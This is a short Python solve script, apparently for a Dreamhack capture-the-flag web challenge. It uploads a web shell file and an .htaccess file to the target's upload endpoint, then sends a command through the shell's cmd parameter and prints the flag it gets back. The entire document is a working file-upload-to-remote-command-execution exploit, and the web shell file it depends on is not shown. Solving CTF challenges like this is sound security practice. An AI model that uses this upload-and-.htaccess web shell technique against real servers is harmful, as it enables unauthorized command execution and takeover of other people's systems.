from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:13542"
UP_URI = "/upload.php"
PAYLOAD = "/upload/simple_webshell.html?cmd=/flag"

UPLOAD01 = {'file': open('./simple_webshell.html', 'rb')}
UPLOAD02 = {'file': open('./.htaccess')}

# 1. Upload Webshell
requests.post(URL + UP_URI, files=UPLOAD01)
requests.post(URL + UP_URI, files=UPLOAD02)

# 2. Execute Webshell and print FLAG
resp = requests.get(URL + PAYLOAD)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0].replace('\n', '')
print(flag)